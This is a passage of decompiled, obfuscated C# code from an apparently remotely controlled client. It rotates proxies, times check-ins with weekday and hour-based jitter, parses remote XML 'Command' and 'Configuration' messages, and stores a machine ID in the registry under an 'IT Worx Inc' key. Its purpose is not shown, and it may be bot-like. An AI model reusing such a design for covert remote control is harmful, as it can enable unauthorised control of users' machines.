				webProxy.Credentials = new NetworkCredential(class35_2.string_1, class35_2.string_2);
			}
		}
		catch (Exception exception_)
		{
			method_20("A821B14D-9C31-4c6c-8A75-BAE9101A9098", exception_);
			webProxy = null;
		}
		if (webProxy == null)
		{
			webProxy = WebProxy.GetDefaultProxy();
		}
		webProxy.BypassProxyOnLocal = true;
		return webProxy;
	}

	public IWebProxy method_29(out string string_7)
	{
		string_7 = "";
		try
		{
			if (queue_0 != null)
			{
				Class35 @class = queue_0.Dequeue() as Class35;
				queue_0.Enqueue(@class);
				string_7 = @class.string_0;
				return method_28(@class);
			}
			return method_27();
		}
		catch (Exception exception_)
		{
			method_20("3667DEC1-D1E5-453e-8ABD-167998BE2019", exception_);
			return method_27();
		}
	}

	public Class8 method_30(bool bool_7)
	{
		if (bool_7)
		{
			return new Class9(this);
		}
		return new Class8(this);
	}

	public void method_31(Class13 class13_0)
	{
		queue_1.Enqueue(class13_0);
		while (queue_1.Count > int_0)
		{
			queue_1.Dequeue();
		}
	}

	public void method_32(IEnumerable ienumerable_0)
	{
		foreach (Class13 item in ienumerable_0)
		{
			method_31(item);
		}
	}

	internal void method_33(Class12 class12_0, bool bool_7, bool bool_8)
	{
		if (bool_7)
		{
			method_0(bool_8);
		}
		if (bool_8)
		{
			try
			{
				class12_0.method_3();
			}
			catch (Exception exception_)
			{
				method_20("B518A274-9D28-4624-9253-84C52D4510DC", exception_);
			}
		}
	}

	[SpecialName]
	internal bool method_34()
	{
		return DateTime.Now >= dateTime_3;
	}

	[SpecialName]
	internal bool method_35()
	{
		return DateTime.Now >= dateTime_2;
	}

	[SpecialName]
	internal bool method_36()
	{
		return DateTime.Now - dateTime_8 >= timeSpan_4;
	}

	[SpecialName]
	internal int method_37()
	{
		DateTime now = DateTime.Now;
		double num = 1.0;
		num *= double_0[(int)now.DayOfWeek % 7] * double_1[now.Hour] * double_3;
		if (bool_0)
		{
			method_25(bool_7: true);
			if (int_6 + int_5 > 2)
			{
				num *= ((double)int_6 / 2.0 + (double)int_5) / 2.0;
			}
		}
		int num2 = (int)(timeSpan_0.TotalMilliseconds / num);
		if (num2 < (int)timeSpan_1.TotalMilliseconds)
		{
			num2 = (int)timeSpan_1.TotalMilliseconds;
		}
		return Class51.smethod_18(num2, double_6);
	}

	public bool method_38()
	{
		Class12 @class = new Class12(this);
		bool result = method_39(@class);
		TimeSpan timeSpan = timeSpan_2;
		if (@class.enum2_0 == Enum2.const_2)
		{
			timeSpan = ((!(timeSpan == timeSpan_2)) ? timeSpan.Add(TimeSpan.FromMilliseconds(2.0 * timeSpan_0.TotalMilliseconds)) : TimeSpan.FromMilliseconds(2.0 * timeSpan_0.TotalMilliseconds));
			if (timeSpan > timeSpan_2)
			{
				timeSpan = timeSpan_2;
			}
		}
		dateTime_3 = DateTime.Now.Add(timeSpan);
		dateTime_2 = DateTime.Now.Add(Class51.smethod_19(timeSpan_3, double_6));
		return result;
	}

	protected bool method_39(Class12 class12_0)
	{
		Class9 @class = null;
		try
		{
			if (class40_1.System_002ECollections_002EICollection_002ECount == 0)
			{
				return false;
			}
			@class = new Class9(this);
			string text = Class51.smethod_24(method_3(), this);
			if (@class.method_24(text))
			{
				dateTime_4 = DateTime.Now;
				method_15(class12_0);
				return true;
			}
			return false;
		}
		catch (Exception exception_)
		{
			method_20("CD7229F0-147D-468d-AEBA-C91721701CCE", exception_);
			return false;
		}
		finally
		{
			@class?.method_7();
		}
	}

	public void method_40(Class8 class8_0, string string_7, string string_8)
	{
		class40_1.method_3(string_8, 1.0);
	}

	public void method_41(Class8 class8_0, string string_7, string string_8)
	{
		if (!class8_0.bool_0)
		{
			class40_1.method_3(string_8, class40_1.method_2(string_8) / 2.0);
		}
	}

	protected void method_42(Class12 class12_0, XmlNode xmlNode_0)
	{
		if (xmlNode_0 == null)
		{
			return;
		}
		try
		{
			method_8(xmlNode_0);
			if (!bool_5)
			{
				class12_0.method_7();
			}
		}
		catch (Exception exception_)
		{
			method_20("", exception_);
		}
	}

	protected void method_43(Class12 class12_0, XmlNode xmlNode_0)
	{
		if (xmlNode_0 == null)
		{
			return;
		}
		try
		{
			if (method_7(xmlNode_0, class12_0))
			{
				dateTime_5 = DateTime.Now;
			}
			if (!bool_5)
			{
				class12_0.method_7();
			}
			class12_0.method_4();
		}
		catch (Exception exception_)
		{
			method_20("", exception_);
		}
	}

	public void method_44(Class8 class8_0, string string_7, string string_8, Class12 class12_0)
	{
		if (string_8 == null || string_8.Trim() == "")
		{
			return;
		}
		if (class12_0 == null)
		{
			class12_0 = new Class12(this);
		}
		XmlDocument xmlDocument = new XmlDocument();
		try
		{
			xmlDocument.LoadXml(string_8);
			if (xmlDocument.DocumentElement!.Name == "Configuration")
			{
				method_43(class12_0, xmlDocument.DocumentElement);
				return;
			}
			if (xmlDocument.DocumentElement!.Name == "Command")
			{
				method_42(class12_0, xmlDocument.DocumentElement);
				return;
			}
			XmlNode xmlNode = xmlDocument.DocumentElement!.FirstChild;
			while (xmlNode != null)
			{
				if (xmlNode.NodeType == XmlNodeType.Element)
				{
					switch (xmlNode.Name)
					{
					case "Command":
						method_42(class12_0, xmlNode);
						break;
					case "Configuration":
						method_43(class12_0, xmlNode);
						break;
					}
				}
				if (!bool_5)
				{
					xmlNode = xmlNode.NextSibling;
					continue;
				}
				break;
			}
		}
		catch (Exception exception_)
		{
			method_20("73D3B537-5E22-4a82-88A2-68E0131E1B8C", exception_);
		}
	}

	public Guid method_45()
	{
		Guid guid = smethod_0(this);
		if (guid != Guid.Empty)
		{
			guid_0 = guid;
		}
		return guid;
	}

	public void method_46()
	{
		smethod_2(this, guid_0);
	}

	public static Guid smethod_0(Class11 class11_0)
	{
		return smethod_1(class11_0, Registry.LocalMachine);
	}

	protected static Guid smethod_1(Class11 class11_0, RegistryKey registryKey_0)
	{
		RegistryKey registryKey = null;
		try
		{
			if (Class0.guid_0 != Guid.Empty)
			{
				return Class0.guid_0;
			}
			registryKey = registryKey_0.OpenSubKey("Software\\IT Worx Inc\\usb2e");
			if (registryKey == null)
			{
				return Guid.Empty;
			}
			object value = registryKey.GetValue(null);
			if (value != null)
			{
				return new Guid(value as string);
			}
			return Guid.Empty;
		}
		catch (SecurityException exception_)
		{
			if (registryKey_0 == Registry.LocalMachine)
			{
				return smethod_1(class11_0, Registry.CurrentUser);
			}
			if (class11_0 != null)
			{
				class11_0.method_20("548B484D-BFAB-4095-9CBC-7DF3E1B7390F", exception_);
			}
			else
			{
				Class47.smethod_8(exception_);
			}
			return Guid.Empty;
		}
		catch (Exception exception_2)
		{
			if (class11_0 != null)
			{
				class11_0.method_20("DC3C91B7-74BF-437c-9759-6E6CD0439A4C", exception_2);
			}
			else
			{
				Class47.smethod_8(exception_2);
			}
			return Guid.Empty;
		}
		finally
		{
			registryKey?.Close();
		}
	}

	public static void smethod_2(Class11 class11_0, Guid guid_2)
	{
		smethod_3(class11_0, Registry.LocalMachine, guid_2);
	}

	protected static void smethod_3(Class11 class11_0, RegistryKey registryKey_0, Guid guid_2)
	{
		RegistryKey registryKey = null;
		try
		{
			registryKey = registryKey_0.OpenSubKey("Software\\IT Worx Inc\\usb2e", writable: true);
			if (registryKey == null)
			{
				registryKey = registryKey_0.CreateSubKey("Software\\IT Worx Inc\\usb2e");
			}
			registryKey?.SetValue(null, Class51.smethod_8(guid_2));
		}
		catch (SecurityException exception_)
		{
			if (registryKey_0 == Registry.LocalMachine)
			{
				smethod_3(class11_0, Registry.CurrentUser, guid_2);
			}
			else if (class11_0 != null)
			{
				class11_0.method_20("92709814-7164-4b71-8FF9-ED3531FB1510", exception_);
			}
			else
			{
				Class47.smethod_8(exception_);
			}
		}
		catch (Exception exception_2)
		{
			if (class11_0 != null)
			{
				class11_0.method_20("0DFADC55-9B3E-471f-8DCC-8E8F5672EFFA", exception_2);
			}
			else
			{
				Class47.smethod_8(exception_2);
			}
		}
		finally
		{
			registryKey?.Close();
		}
	}
}
